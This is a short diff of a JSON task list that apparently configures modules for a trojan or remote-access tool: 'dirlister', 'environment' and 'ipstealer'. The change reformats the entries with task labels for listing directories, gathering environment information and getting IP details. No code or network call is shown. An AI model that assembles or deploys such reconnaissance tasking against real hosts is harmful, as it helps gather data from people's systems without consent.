@@ -1,14 +1,5 @@
 [
-    {
-        "module": "dirlister",
-        "args": {}
-    },
-    {
-        "module": "environment",
-        "args": {}
-    },
-    {
-        "module": "ipstealer",
-        "args": {}
-    }
+    {"module": "dirlister.py", "task": "list_directory"},
+    {"module": "environment.py", "task": "gather_info"},
+    {"module": "ipstealer.py", "task": "get_ip_info"}
 ]
